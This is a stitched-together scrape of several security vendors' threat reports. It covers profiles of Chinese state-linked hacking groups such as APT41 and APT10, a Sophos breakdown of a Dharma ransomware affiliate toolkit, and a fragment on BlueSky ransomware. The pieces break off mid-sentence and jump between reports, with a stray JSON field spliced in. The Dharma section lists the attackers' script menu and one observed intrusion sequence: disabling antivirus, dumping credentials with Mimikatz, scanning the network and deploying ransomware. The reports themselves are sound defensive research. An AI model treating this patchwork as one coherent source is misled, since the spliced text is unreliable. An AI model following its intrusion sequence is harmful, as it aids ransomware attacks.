Japan,\nHong Kong, and the U.S., with a focus on East Asia.\n\nhttps://attack.mitre.org/techniques/T1574/001/\nhttps://www.secureworks.com/research/bronz-vinewood-uses-hanaloader-to-target-government-supply-chain\nhttps://www.trendmicro.com/en_us/research/17/f/following-trail-blacktech-cyber-espionage-campaigns.html\nhttps://www.welivesecurity.com/2018/07/09/certificates-stolen-taiwanese-tech-companies-plead-malware-campaign/\nhttps://www.trendmicro.com/en_us/research/19/l/waterbear-is-back-uses-api-hooking-to-evade-security-product-detection.html\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/palmerworm-blacktech-espionage-apt\nhttps://blogs.jpcert.or.jp/en/2020/11/elf-plead.html\nhttps://www.reuters.com/article/us-taiwan-cyber-china/taiwan-says-china-behind-cyberattacks-on-government-agencies-emails-idUSKCN25F0JK\n\n\n13/20\n\nSample\nTTPs\n\nVarious custom backdoors, including the well-documented PLEAD (also\ntracked as TSCookie)\nDeployment of PLEAD using compromised legitimate software, potentially\nvia compromised routers and man-in-the-middle attacks \nUse of legitimate system tools (Putty, PSExec, etc.) for malicious\npurposes (i.e., “living-off-the-land” tactics)\nUse of the DLL-hijacking Waterbear modular malware\n\nAKA Palmerworm, CIRCUIT PANDA\n\nAPT 41 / Winnti\n\nOverview:\n\nAPT41 represents one of the most prolific Chinese state-sponsored threats. Incarnations of\nAPT41 began to appear in the early 2010s, and the group is believed to have been behind\nintrusions into a wide variety of sectors, including the healthcare, pharmaceutical,\ntelecommunications, and video game industries, with victims on nearly every continent. Over\nthe years, the group has leveraged a variety of custom malware, including a Trojan that\ncame to be known as Winnti. \n\nThe group is probably best known for a series of software supply chain attacks where the\nthreat actors obtain access to software provider systems and inject malicious code into the\nvictim’s legitimate software, often managing to distribute the poisoned software through the\nvictim’s established channels. Such attacks are especially challenging to detect and mitigate\nfrom a consumer perspective, as end users and system administrators invariably trust\nsoftware that has been downloaded directly from the publisher. Notably, some of the\nindividuals comprising APT41 appear to have engaged in not just state-sponsored\nespionage, but have also dabbled in operations designed to reap personal financial gain.\n\nThere is notable overlap and a significant lack of clarity within the commercial cybersecurity\ncommunity on precisely which groups are behind the many intrusions that have been lumped\ntogether under the Winnti umbrella. Some notable software supply chain attacks that have\nbeen potentially linked to the group by various cybersecurity researchers include the \nCCleaner, NetSarang, and Asus Live Update compromises. Given the history of software\ntool sharing amongst Chinese threat actors and the likelihood that multiple state-sponsored\nactors are targeting similar sets of victims, it becomes quite difficult to parse exactly which\ngroup may be behind a given intrusion, especially given the limited visibility that any one\nvictim or vendor may have. In any case, the overarching tactics and targets described above\ncan safely be ascribed to PRC cyber operators, regardless of how specifically each discrete\nintrusion can be attributed.\n\nRecent Activity: \n\nhttps://blogs.jpcert.or.jp/en/2018/03/malware-tscooki-7aa0.html\nhttps://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/\nhttps://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\nhttps://securelist.com/winnti-more-than-just-a-game/37029/\nhttps://risky.biz/whatiswinnti/\nhttps://www.intezer.com/blog/research/evidence-aurora-operation-still-active-part-2-more-ties-uncovered-between-ccleaner-hack-chinese-hackers/\nhttps://securelist.com/shadowpad-in-corporate-networks/81432/\nhttps://securelist.com/operation-shadowhammer/89992/\n\n\n14/20\n\nIn June 2021, Mandiant discovered a potential APT41 campaign targeting at least four U.S.\nstate governments in May 2021, in which they used three C2 servers, previously identified\nmalware, and multiple SQL injection attempts. Researchers suspect the group is targeting\nvulnerable internet-accessible servers of U.S. state government entities to gain initial access\nfor intrusion operations. There is currently an ongoing investigation of these intrusions, so\nthey have not been able to label a specific motive at this time; however, the direct targeting\nof U.S. state government entities is a concerning development given the nature of APT41\ncampaigns. This perhaps is an attempt to circumvent better prepared and/or resourced\nfederal agencies and to target state and local government for easier access to the same or\nsimilar material.\n\nIt was revealed in June 2021 that APT41 is believed to be responsible for an almost three\nmonth long cyberattack against Air India. Since at least February 23rd, Group-IB observed\nan infected device in Air India’s network (“SITASERVER4”) communicating with a C2 server\nhosting Cobalt Strike payloads that date back to December 11th, 2020. After this initial\ncompromise, the APT41 threat actors acquired passwords and achieved persistence to\nmove laterally into the larger network with the objective of collecting information inside Air\nIndia's local network. Reportedly, at least 20 devices were compromised in the course of this\nlateral movement, and the attackers managed to use hashdump and mimikatz to exfiltrate\nNTLM hashes and plain-text passwords from local systems. All in all, APT41 was able to\nextract almost 24 MB of information from five devices, taking just over 24 hours to spread\nCobalt Strike beacons to other systems in Air India’s network.\n\nAnother large-scale APT41 campaign occurred in early 2020, once again affecting a wide\nvariety of industries in multiple global regions. The operators appeared to be systemically\nleveraging a number of recently identified high severity vulnerabilities, specifically in Cisco\nrouters, Citrix infrastructure devices, and Zoho ManageEngine Desktop Central, an endpoint\nmanagement software tool. Notably, the Citrix and Zoho vulnerabilities were also highlighted\nin a recent NSA advisory detailing public technical vulnerabilities known to have been\nactively exploited by Chinese state-sponsored actors.\n\nThe U.S. Department of Justice (DOJ) also shone a light on APT41 in September of 2020,\nunsealing three indictments that brought charges against five Chinese nationals and two\nMalaysians for a sweeping series of network intrusions. The DOJ linked the activity to a\nChinese company known as Chengdu 404 Network Technology, which likely operates at the\nbehest of the Chinese Ministry of State Security. The indictments stated that the hackers\nwere responsible for intrusions across over 100 victim organizations in numerous countries.\nOne of the indictments charged the two Malaysian individuals with profiting from information\nstolen from video game companies that was provided to them by Chinese actors. Both men\nwere apprehended by Malaysian authorities. The operators apparently also participated in\nransomware and crypto-jacking attacks, which highlight the type of for-profit criminal\nendeavors the group has undertaken apart from their more traditional information gathering\noperations.\n\nhttps://thehackernews.com/2021/06/chinese-hackers-believed-to-be-behind.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+TheHackersNews+%28The+Hackers+News+-+Cyber+Security+Blog%29\nhttps://www.airindia.in/\nhttps://blog.group-ib.com/colunmtk_apt41\nhttps://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\nhttps://media.defense.gov/2020/Oct/20/2002519884/-1/-1/0/CSA_CHINESE_EXPLOIT_VULNERABILITIES_UOO179811.PDF\nhttps://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer\n\n\n15/20\n\nKnown\nTargets\n\nNumerous sectors, including healthcare, media, and video games with multiple\ncountries targeted, including the U.S., Japan, South Korea, India, Australia, and\nthe U.K.\n\nSample\nTTPs\n\nSoftware supply chain attacks which modified legitimate software to\nfacilitate intrusions against the software’s customers \nUse of stolen digital certificates to sign malware\nCommand and control (C2) dead drops leveraging seemingly legitimate\nweb pages to surreptitiously pass encoded instructions to deployed\nmalware\nExploitation of remote access or internet facing services to gain initial\naccess to victim networks\n\nAKA Barium, Winnti, Wicked Panda, Wicked Spider\n\nAPT40\n\nOverview:\n\nLikely active since at least 2013, APT40 is a Chinese threat group with a predominant focus\non nations and issues related to the South China Sea, a region the PRC has claimed\nterritorial sovereignty over despite numerous disputes. The group has repeatedly targeted\nshipbuilding, maritime, and engineering entities, as well as government and academic\ninstitutions within multiple countries bordering the South China Sea. The group has\nleveraged a variety of malicious software, including publicly available tools such as Cobalt\nStrike and custom tools, some of which overlap with other known Chinese groups. Analysis\nof data obtained from APT40 infrastructure showed malware administrators accessing the\ngroup’s servers from Hainan, China, which strongly suggests Chinese state sponsorship\nwhen coupled with the group’s targeting patterns. \n\nRecent Activity: \n\nRecent analysis released by Microsoft indicates that APT40 threat actors have on multiple\noccasions attempted to use cloud-native services within Azure to conduct malicious C2.\nAlthough the activity was identified and disrupted, the threat actors appear to have\nspecifically designed malware to abuse proprietary cloud services including the Outlook Task\nAPI, OneDrive API, and Microsoft Graph API.\n\nAPT40 was also among the Chinese groups Taiwan publicly accused of targeting multiple\nTaiwanese government agencies, alongside BlackTech, Mustang Panda, and other groups.\nThis coincides with particularly aggressive Chinese cyber targeting of Taiwan’s technology\n\nhttps://www.fireeye.com/blog/threat-research/2019/03/apt40-examining-a-china-nexus-espionage-actor.html\nhttps://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets\nhttps://www.fireeye.com/blog/threat-research/2018/07/chinese-espionage-group-targets-cambodia-ahead-of-elections.html\nhttps://www.microsoft.com/security/blog/2020/09/24/gadolinium-detecting-empires-cloud/\nhttps://www.scmp.com/news/china/diplomacy/article/3098012/mainland-chinese-hackers-attacked-government-agencies-steal\n\n\n16/20\n\nsector witnessed over the past couple years.

The group has also been noted targeting Western think tanks and\nNGOs with a nexus to Chinese minority groups. The group has likely been active since at\nleast 2017. \n\nMustang Panda frequently relies on phishing lures centered around themes directly relevant\nto their targeted victims. These lures use official-looking documents written in the target’s\nnative language and containing information that would prompt the victim to open the\nattached document. These decoy documents frequently contain a .zip archive that executes\na malicious loader when opened. This leads to the installation of the venerable PlugX\nmalware or a Cobalt Strike Beacon.\n\nRecent Activity: \n\nIn the summer of 2020, Recorded Future reported newly identified activity related to Mustang\nPanda, which they track as RedDelta. Notably, the group targeted a number of organizations\nrelated to the Catholic Church. The researchers surmised that this activity was likely\nconnected to the renewal of an agreement between the Vatican and the CCP and was likely\ndesigned to provide insights into the upcoming negotiations (a tactic often used by the\nChinese government in political or business contexts). \n\nhttps://www.zdnet.com/article/malaysia-warns-of-chinese-hacking-campaign-targeting-government-projects/\nhttps://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/\nhttps://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations\nhttps://go.recordedfuture.com/hubfs/reports/cta-2020-0728.pdf\n\n\n17/20\n\nDespite the campaign being identified in this way, it appears the threat actors resumed\nactivity within days of the RedDelta report’s publication. Additional research shows the group\nhas remained active into Fall 2020 and has updated the malware loader they use to install\ntheir favored PlugX Remote Access Trojan (RAT).\n\nKnown\nTargets\n\nGovernment entities, NGOs, and religious organizations in Mongolia, Hong\nKong, Vietnam, Burma, India, and Pakistan; NGOs and think tanks abroad with\na nexus to Southeast Asia and Chinese minority groups\n\nSample\nTTPs\n\nUse of multiple versions of the PlugX and Poison Ivy malware shared\namongst Chinese threat actors\nInfection chains delivering .zip files containing Windows Shortcut (.lnk)\nfiles, which in turn execute malicious code leading to the installation of\nPlugX or Cobalt Strike\nThe use of DLL side-loading tactics to install malicious software\n\nAKA RedDelta, TA416, BRONZE PRESIDENT\n\nTA410\n\nOverview:\n\nIn July 2019, several U.S. utility companies were targeted with a well-designed\nspearphishing campaign that impersonated a legitimate engineering licensing board to\ndeliver the LookBack malware. This campaign was attributed to a group tracked as TA410,\nwho proceeded to conduct a follow-on campaign once again targeting U.S. electric utilities in\nAugust of that year. Later media reports indicated that several smaller, regional public power\nutilities were among those targeted and that some were apparently unaware they had been\ntargeted at all until they were informed by the FBI. \n\nRecent Activity: \n\nAdditional analysis later linked the LookBack phishing campaigns to another malware family\ndubbed FlowCloud. These two campaigns share a number of tactics, including the\ntimeframes they were active, the use of malicious attachments contained in phishing emails,\nthe installation techniques used, and overlapping infrastructure. Like LookBack, the\nFlowCloud campaign appears to have targeted victims in the utilities sector using well-\ncrafted phishing emails impersonating professional organizations within the industry such as\nthe American Society of Civil Engineers. \n\nNotably, the researchers investigating TA410 identified similarities to the tactics used by\nTA429 (also known as APT10: see below). However, it is not fully clear whether the two\ngroups’ activity is truly related or whether this may have been a deliberate attempt by those\n\nhttps://www.recordedfuture.com/reddelta-cyber-threat-operations/\nhttps://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader\nhttps://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks\nhttps://www.proofpoint.com/us/threat-insight/post/lookback-forges-ahead-continued-targeting-united-states-utilities-sector-reveals\nhttps://www.utilitydive.com/news/small-regional-utilities-located-near-critical-infrastructure-targeted-in/568074/\nhttps://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new\n\n\n18/20\n\nresponsible to plant \"false flags\" to help hide those behind the campaigns. The attempt to\nhide the campaign actors makes sense especially given the widespread media attention\nfocused on APT10 due to the publication of multiple reports on the group and a related U.S.\nindictment of Chinese actors.\n\nKnown\nTargets\n\nU.S. electric utilities\n\nSample TTPs Sophisticated spearphishing\nUse of Microsoft Office documents with embedded malicious VBA\nmacros\nReconnaissance scanning against targets (specifically SMB)\n\nAKA None known\n\nAPT10\n\nOverview:\n\nAPT10 is a prolific and long-standing Chinese state-sponsored threat actor that has been\nactive since at least 2006. The group’s focus appears to be access enablement, providing\ninroads to support commercial and economic espionage against regional and international\ncompetitors including Japan, the United Kingdom, and the United States. Like so many\nthreat groups, APT10 has historically used spearphishing tactics to gain initial footholds on\nvictim networks. The operators then rely upon a combination of custom and publicly available\nhacking tools to move laterally throughout victim networks and establish persistence.\n\nIn 2017, details surrounding an APT10 campaign known as Operation Cloud Hopper came to\nlight. The campaign focused on compromising IT managed service providers (MSPs), which\nare businesses that remotely manage IT infrastructure on behalf of their clients.\nCompromising these MSPs provided APT10 actors with access to the service providers as\nwell as their customers. The MSPs’ connections to their customer environments were at\ntimes used by APT10 to exfiltrate data from within customer environments. 2018 indictments\nby the U.S. Department of Justice revealed that those behind these campaigns worked for a\ncompany operating at the behest of the Ministry of State Security’s Tianjin State Security\nBureau. Later media reporting revealed just how widespread and successful this strategy\nhad been, as several major MSPs appear to have been victimized by the group over the\nspan of several years. \n\nAdditional reporting in 2019 asserted that APT10 actors had penetrated at least ten\ntelecommunications or cellular provider companies across the globe in a campaign dubbed\nOperation Soft Cell. During this campaign, APT10 operators appeared to have been\ntargeting Call Detail Records, which contain metadata regarding individual mobile\n\nhttps://us-cert.cisa.gov/sites/default/files/publications/Chinese-Cyber-Activity-Targeting-Managed-Service-Providers.pdf\nhttps://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf\nhttps://www.justice.gov/opa/pr/two-chinese-hackers-associated-ministry-state-security-charged-global-computer-intrusion\nhttps://www.reuters.com/investigates/special-report/china-cyber-cloudhopper/\nhttps://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers\n\n\n19/20\n\nsubscribers including information such as device identifiers, locations, and call history. Such\ninformation would be considered highly useful to a foreign intelligence service and fits with\nAPT10’s history of facilitating access to sensitive datasets.\n\nRecent Activity: \n\nAn A41APT campaign, attributed to APT10, is noted to be a sophisticated campaign that\ndeploys malicious backdoors to exfiltrate information from a number of Japan-linked\ncompanies in different industry sectors across the world. The activity was first detected in\nMarch 2019, carrying out through December 2020, with latest attacks said to have occurred\nin January 2021 and JPCERT/CC stating attacks are still ongoing. The campaign includes a\nmulti-stage attack process, with initial intrusion happening via the exploitation of\nvulnerabilities in Pulse Connect Secure, a widely used SSL-VPN, in order to hijack VPN\nsessions. In this campaign, APT10 uses previously undocumented malware, most notable of\nwhich is one particular piece of malware called Ecipekac, which is a multi-layer loader\nmodule used to deliver as many as 3 payloads, such as SodaMaster, P8RAT, and FYAnti.\nIronNet has created TIRs related to this campaign and pushed them to customer\nenvironments.\n \n\nIn addition, published research details continued cyber espionage activity being conducted\nby APT10 operators. This latest research provides evidence of yet another large-scale\nintrusion campaign targeting multiple global regions and sectors between Fall 2019 and Fall\n2020. Most of the victims appear to have a connection to Japanese companies, with the\nautomotive, pharmaceutical, and engineering sectors among those targeted. The campaign\nonce again went after MSPs, the group’s most favored target. During the campaign, APT10\nwas observed using a variety of dual-use and custom malware, extensively using DLL side-\nloading techniques to execute their malware and exploiting the recently publicized\nZeroLogon vulnerability affecting Microsoft Windows systems.\n\nKnown\nTargets\n\nTelecommunications, defense, construction, engineering, aerospace, and\ngovernment sectors (among others) in the U.S., Europe, and Japan with a\nconsistent focus on MSPs\n\nSample\nTTPs\n\nSpearphishing using malicious attachments\nDLL side-loading techniques\nUse of publicly available, quasi-legitimate remote access tool Quasar\nUse of various shared Chinese malware families, including Poison Ivy and\nPlugX\nPersistent targeting of MSPs for use as conduits to their customer\nnetworks\n\nAKA TA429, Menupass, Red Apollo, Stone Panda, Cicada\n\nhttps://thehackernews.com/2021/03/hackers-are-implanting-multiple.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+TheHackersNews+%28The+Hackers+News+-+Cyber+Security+Blog%29\nhttps://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/\nhttps://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage\nhttps://github.com/quasar/QuasarRAT\n\n\n20/20\n\nCollective Defense against China cyber attack threats\n\nAs evidenced by the numerous examples of Chinese cyber campaigns waged against\ncommercial, government, and nongovernmental entities around the world, it is clear that\nChina has made cyber espionage a hallmark of its global strategy. Chinese leadership has\nfocused massive resources on building out their nation’s cyber capabilities to both secure the\nCommunist Party’s preeminence within the country and project power beyond its borders.\nOrganizations working in an immensely broad number of fields have been targeted, ranging\nfrom renewable energy to nanotechnology to human rights. These broad and persistent\ntargeting patterns are likely to continue the years to come.\n\nChinese tactics, techniques, and procedures have grown in sophistication as well. Once well\nknown for executing “smash and grab” operations seeking to simply steal large amounts of\ndata from their victims as quickly as possible, Chinese threat groups have since evolved. As\nthe case studies above highlight, Chinese threat actors now seek new and novel ways to\nexecute their attacks and hide them from network defenders. Innovation and collaboration\nhave thus become paramount for defenders to identify and prevent such threats.\n\nIronNet’s mission is to provide companies, sectors, and nations with the cutting-edge tools\nrequired to defend against sophisticated threats in cyberspace. The behavioral analytics and\nthreat intelligence built into our IronDefense platform provide the unique insights required to\ndetect advanced threat actors, while our IronDome Collective Defense solution allows\norganizations to collectively defend against such threats using machine-speed correlation of\ndata. We believe that technological innovation and collaboration amongst those seeking to\nsecure cyberspace can ultimately overcome those seeking to divide and exploit it.\n\nAbout Ironnet\n\nFounded in 2014 by GEN (Ret.)

      "plain_text": "1/28\n\nSean Gallagher August 12, 2020\n\nColor by numbers: inside a Dharma ransomware-as-a-\nservice attack\n\nnews.sophos.com/en-us/2020/08/12/color-by-numbers-inside-a-dharma-ransomware-as-a-service-attack/\n\nDharma, a family of ransomware first spotted in 2016, continues to be a threat to many\norganizations—especially small and medium-sized businesses. Part of the reason for its\nlongevity is that its variants have become the basis for ransomware-as-a-service (RaaS)\noperations—the fast-food franchise of cybercrime. Three recent attacks documented by\nSophosLabs and Sophos MTR have revealed a toolset used by Dharma “affliliates” that\nexplains why attacks from so many different Dharma actors seem so identical, down to the\ntools and commands they use.\n\nWhile other, newer ransomware families have grabbed recent headlines with high-profile\nvictims and multi-million-dollar demands, Dharma has continued to be among the most\nprofitable.  In part that’s because actors with access to the source code continue to innovate\naround delivering the ransomware as a packaged business for less-sophisticated criminal\noperators. The Dharma RaaS we’ve investigated is targeted at entry-level cyber-criminals,\nand provides a paint-by-the-numbers approach to penetrating victims’ networks and\nlaunching ransomware attacks.\n\nThe actors using this particular RaaS are equipped with a package of pre-built scripts and\n“grey hat” tools that requires relatively little skill to operate. The Dharma operations we’ve\ndocumented use a combination of internal Windows tools, legitimate third-party “freeware”\nsoftware, well-known security tools and  publicly-available exploits, integrated together\nthrough bespoke PowerShell, batch, and AutoIT scripts. This pre-packaged toolkit, combined\nwith back-end technical support, significantly extends the reach of the Dharma RaaS\n\nhttps://news.sophos.com/en-us/2020/08/12/color-by-numbers-inside-a-dharma-ransomware-as-a-service-attack/\nhttps://www.autoitscript.com/site/\n\n\n2/28\n\noperators, allowing them to profit while their afililates do the hands-on-keyboard work of\nbreaching networks, dropping ransomware, and managing “customer service” with the\nvictims.\n\nRansomware economics\n\nDharma, formerly known as CrySis, has many variants, due to the sale and modification of\nits source code to multiple malware developers. Those transfers aren’t necessarily from the\nmalware’s original authors, either—in March, a collection of source code for one variant of\nDharma was offered for sale on Russian-language crime forums for $2000 through an\nintermediary.\n\nA\n\nforum post from March 2020 offering the Dharma ransomware sourcecode for $2000.\n\nhttps://news.sophos.com/wp-content/uploads/2020/08/Attack-killchain-mitre-template-Read-Only.png\nhttps://nakedsecurity.sophos.com/2020/03/31/dharma-ransomware-source-code-on-sale-for-2000/\nhttps://news.sophos.com/wp-content/uploads/2020/08/dharmasource_sale.png\n\n\n3/28\n\nBecause of its availability, Dharma has become the center of a criminal ecosystem based on\na “syndication” business model. Dharma RaaS providers offer the technical expertise and\nsupport, operating the back-end systems that support ransomware attacks. “Affiliates” (often\nentry-level cybercriminals) pay for the use of the RaaS, and carry out the targeted attacks\nthemselves, using a standard toolkit. Other actors provide stolen credentials and other tools\non criminal forums that enable the Remote Desktop Protocol attacks that are the\npredominant means of initial compromise for Dharma actors. (RDP attacks are the root\ncause of about 85 percent of Dharma attacks, based on statistics provided by Coveware.)\n\nA\n\ndark web site selling RDP credentials, including some with administrative privileges. These\nmarketplaces in some cases allow buyers to verify the accounts work before they buy them.\nRansom demands from Dharma actors trend below those of the other major types of\ntargeted ransomware over the past year. In December of 2019, when the average\nransomware demand had surged to $191,000, the average Dharma ransom demand was\nonly $8,620. That’s in part due to the types of targets hit by Dharma (mostly small and\nmedium businesses), and in part because of the skills, experience and location of the\naffiliates running the attacks. In any case, Dharma operators make up for the lower ransom\ndemands with volume—Dharma remains one of the most profitable ransomware families,\naccording to Coveware.\n\nDharma uses a complicated two-stage decryption process that partitions the affiliate actors\nfrom the actual key retrieval process. Victims who contact the attackers are given a first-\nstage tool that extracts information about the files that were encrypted into a text file. That\n\nhttps://www.coveware.com/dharma-ransomware-payment\nhttps://news.sophos.com/wp-content/uploads/2020/08/RDP_for_sale.png\n\n\n4/28\n\ntext file gets cut-and-pasted into email and is sent back to the affiliates—who then have to\nsubmit that data through a portal for the RaaS to obtain the actual keys. This keeps the\naffiliates dependent on the RaaS, and it keeps them paying for service.\n\nJust how well the decryption process works depends greatly on the expertise and the moods\nof the affiliates. Occasionally an actor will hold back some of the keys with additional\ndemands. And there’s constant “churn” among the front-end actors, as the “subscriptions” of\nsome to RaaS services expire and others with less experience take their place, resulting in\noccasional misfires.\n\nThe Dharma playbook\n\nMost Dharma operators don’t make significant changes to the source. But Dharma RaaS\noperators appear to package together a number of tools and best practices for their\n“affiliates” to use once they’ve gotten onto a victim’s network.\n\nThese tools aren’t completely automated, as every attack does not follow the same exact\nsteps. However, they do follow something amounting to step-by-step instructions, akin to a\ntelemarketer’s script, allowing some room for improvisation. And one of those tools is a\nmenu-driven PowerShell script that installs and launches the components required to spread\nransomware across the network.\n\nAfter getting an RDP connection,  the attacker maps a directory containing the RaaS toolkit\non their local drive  as a network drive accessible from the remote desktop.  The contents of\nthis directory include a number of applications previously identified as potentially unwanted\napplications (such as the Mimikatz password extraction tool), customized hacking tools,  and\nfreeware versions of a variety of legitimate system utilities.  (A full list of the files is included\nin the indicators of compromise file on SophosLabs’ GitHub page. )\n\nThe kit also includes the Dharma ransomware executable, and a collection of PowerShell\nscripts, most of which we were unable to recover for analysis. However, we did recover a\nmaster script from console logs. Called toolbelt.ps1, the  menu-driven console script\nautomates the use of the tools, allowing attackers to simply type in the number associated\nwith each pre-scripted element.\n\nWhen executed, it identifies itself in the console frame as “Toolbox,” and if executed with\nadministrative privileges, advises the user/attacker, “Have fun, bro!”\n\nhttps://github.com/sophoslabs/IoCs/blob/master/Ransomware-Dharma-RaaS.csv\n\n\n5/28\n\nThe startup screen for toolbelt.ps1\nThe “menu”  selections in Toolbox aren’t displayed as a menu by the script as it executes,\nthough they are largely documented in the script itself.  Tools are downloaded to the remote\ncomputer by the script as needed,  executed, and in many cases deleted after use.\n\nThe menu commands we identified, by the numbers and symbols they are called by, were as\nfollows:\n\n“Menu”\nentry Triggered function\n\n+ Executes Start-Tor.ps1, a script that launches a Tor network connection.\n\n. Executes Email-Screenshot.ps1, which creates a screenshot from the remote\nsystem and sends to the email address (provided by the operator at a prompt in\nthe script).\n\n1 Runs LaPass.ps1, a “User changer” script. (We could not recover the script\nitself.)\n\nhttps://news.sophos.com/wp-content/uploads/2020/08/startscreen.png\n\n\n6/28\n\n2 Starts lusrmgr.msc, the Windows local user management plug-in.\n\n3 Executes lubrute.ps1, a PowerShell script that attempts to get passwords to\nlocal user accounts through a brute force attack.\n\n4 Copies and launches Mimikatz password extraction tools, dumping results to a\ntext file.\n\nhttps://news.sophos.com/wp-content/uploads/2020/08/2.png\n\n\n7/28\n\n5 Executes Find-Pass.ps1, a PowerShell script.  (We were unable to recover this\nscript for analysis.)\n\n6 Copies  password viewers from a shared directory on the initially compromised\nmachine to %temp%, and then opens a File Explorer window on that directory. \n\nhttps://news.sophos.com/wp-content/uploads/2020/08/4.png\n\n\n8/28\n\n6\n\nhttps://news.sophos.com/wp-content/uploads/2020/08/6.png\n6\n\n&9 Toolbox 27.01.2020\n\n——_ |\n\nMACHINE :\n\nPROCESSOR: x32\n\nos : Microsoft Windows T Professional\n\n: Administrator.

If the code\ncreation fails, the script advises the attacker to use menu entry 52 to respawn\nPowerShell.\n\nThe order of the use of the toolbelt.ps1 script varies, but we have observed common patterns\namong Dharma attackers. In one typical attack, we saw the operators follow the following\nsteps:\n\nThe attacker launched the toolbelt script (toolbelt.ps1 -it 1)\n10: delete-avservices.ps1\n15: GMER (gamer.exe)\n13: installing and launching ProcessHacker\n\nexecuting processhacker-2.39-setup.exe\nexecuting processhacker.exe\n\n222: javsec.exe (Mimikatz /NL Brute wrapper)\n\n\n\n28/28\n\n34: ipscan2.exe (Advanced IP Scanner)\n32: mstsc.exe\n21: takeaway.exe (ransomware package)\n\nexecutes winhost.exe (Dharma)\nexecutes purgememory.ps1\n\n33: ns2.exe (network scan)\n\nPlaying by the book\n\nWhile the toolbelt.ps1 script is somewhat self-documenting, it’s clear that the end users of\nthe script—the Dharma affiliates—are also operating from some other form of\ndocumentation.  The “toolbelt” gives them all the access they need to move laterally across\nthe network, exploiting domain administrator level credentials that they either steal or create\nthrough elevated privileges, but it’s not clear how fully automated some of the steps of that\nprocess are. Those steps are likely detailed in a how-to document created by the Dharma\nRaaS operators.\n\nThe ease with which Dharma attackers are able to take these tools and effectively spread\nransomware on victims’ networks demonstrates the risks posed by both grey hat and\nlegitimate but potentially unwanted administrative tools. And it underlines the risks\nassociated with improperly secured RDP servers, the major vector for most targeted\nransomware attacks.  Given that many of these attacks are made with stolen credentials\npurchased in forums, the Dharma attacks may be just one of many intrusions onto victims’\nnetworks.\n\nThe majority of these Dharma affiliate attacks can be blunted by ensuring  RDP servers are\npatched and secured behind a VPN with multi-factor authentication. Organizations need to\nremain vigilant about credential theft through phishing, particularly as they adjust to having\nmore employees working remotely. And attention needs to be paid to access given to to\nservice providers and other third parties for business purposes.\n\nSophos detects the tools mentioned in this report as malware or PUAs.

BlueSky ransomware predominantly targets Windows hosts and utilizes\nmultithreading to encrypt files on the host for faster encryption.\n\nIn our analysis, we found code fingerprints from samples of BlueSky ransomware that can be\nconnected to the Conti ransomware group. In particular, the multithreaded architecture of BlueSky\nbears code similarities with Conti v3, and the network search module is an exact replica of it.\n\nhttps://unit42.paloaltonetworks.com/bluesky-ransomware/\nhttps://unit42.paloaltonetworks.com/author/muhammad-umer-khan/\nhttps://unit42.paloaltonetworks.com/author/lee-wei/\nhttps://unit42.paloaltonetworks.com/author/yang-ji/\nhttps://unit42.paloaltonetworks.com/author/wenjun-hu/\nhttps://unit42.paloaltonetworks.com/category/malware-2/\nhttps://unit42.paloaltonetworks.com/category/ransomware/\nhttps://unit42.paloaltonetworks.com/tag/babuk/\nhttps://unit42.paloaltonetworks.com/tag/bluesky-ransomware/\nhttps://unit42.paloaltonetworks.com/tag/cloud-delivered-security-services/\nhttps://unit42.paloaltonetworks.com/tag/conti-ransomware/\nhttps://unit42.paloaltonetworks.com/tag/cortex-xdr/\nhttps://unit42.paloaltonetworks.com/tag/investigation-and-response/\nhttps://unit42.paloaltonetworks.com/tag/next-generation-firewall/\nhttps://unit42.paloaltonetworks.com/tag/powershell/\nhttps://unit42.paloaltonetworks.com/tag/redline-infostealer/\nhttps://unit42.paloaltonetworks.com/tag/threat-intelligence/\nhttps://unit42.paloaltonetworks.com/tag/url-filtering/\nhttps://unit42.paloaltonetworks.com/tag/wildfire/\nhttps://unit42.paloaltonetworks.jp/bluesky-ransomware/\nhttps://unit42.paloaltonetworks.com/conti-ransomware-gang/\n\n\n2/13\n\nHowever, in another respect, BlueSky more closely resembles Babuk Ransomware. Both use\nChaCha20, an algorithm for file encryption, along with Curve25519 for key generation.\n\nAccording to research done by CloudSEK, PowerShell scripting is used to drop and download\nBlueSky ransomware from a fake website to encrypt data. After successful encryption, BlueSky\nRansomware renames the encrypted files with the file extension .bluesky and drops a ransom note\nfile named # DECRYPT FILES BLUESKY #.txt and # DECRYPT FILES BLUESKY #.html.\n\nPalo Alto Networks customers receive protections from BlueSky ransomware and other types of\nransomware through Cortex XDR, the Next-Generation Firewall and cloud-delivered security\nservices including WildFire.

